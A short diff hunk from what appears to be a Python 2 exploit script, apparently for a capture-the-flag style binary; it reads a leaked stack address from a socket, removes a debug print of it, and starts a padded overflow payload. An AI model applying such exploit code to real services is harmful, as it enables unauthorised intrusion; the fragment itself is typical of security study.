@@ -19,8 +19,6 @@ s.send(payload)
 sleep(0.3)
 stack = up32(s.recv(4))
 
-print "%x" % stack
-
 print s.recv(4096)
 
 payload = "A"*20
